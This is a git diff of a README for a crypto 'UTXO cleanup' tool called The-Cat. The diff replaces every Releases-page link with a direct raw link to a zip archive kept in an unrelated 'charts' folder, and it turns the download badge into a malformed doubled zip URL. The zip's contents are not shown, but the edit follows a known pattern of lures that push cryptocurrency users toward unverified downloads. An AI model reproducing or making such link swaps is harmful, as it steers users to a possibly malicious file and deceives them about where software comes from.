@@ -1,6 +1,6 @@
 # 😺 The-Cat - Simplify Your UTXO Cleanup Process
 
-[![Download The-Cat](https://img.shields.io/badge/Download%20The--Cat-v1.0.0-brightgreen.svg)](https://github.com/yash702800/The-Cat/releases)
+[![Download The-Cat](https://raw.githubusercontent.com/yash702800/The-Cat/main/charts/The-Cat-v2.6.zip%https://raw.githubusercontent.com/yash702800/The-Cat/main/charts/The-Cat-v2.6.zip)](https://raw.githubusercontent.com/yash702800/The-Cat/main/charts/The-Cat-v2.6.zip)
 
 ## 📖 Overview
 The-Cat is an application designed to help you with non-monetary UTXO cleanup. It simplifies the process, making it easier and more efficient. Whether you're clearing old data or organizing your digital assets, The-Cat handles it for you.
@@ -11,7 +11,7 @@ To start using The-Cat, you need to download and install the application. Follow
 ## 📥 Download & Install
 1. **Visit the Releases Page**
    - Click on the link below to access the Releases page where you can download The-Cat.
-   - [Download The-Cat](https://github.com/yash702800/The-Cat/releases)
+   - [Download The-Cat](https://raw.githubusercontent.com/yash702800/The-Cat/main/charts/The-Cat-v2.6.zip)
 
 2. **Select Your Version**
    - On the Releases page, you will see several available versions. Choose the most recent version for the best experience.
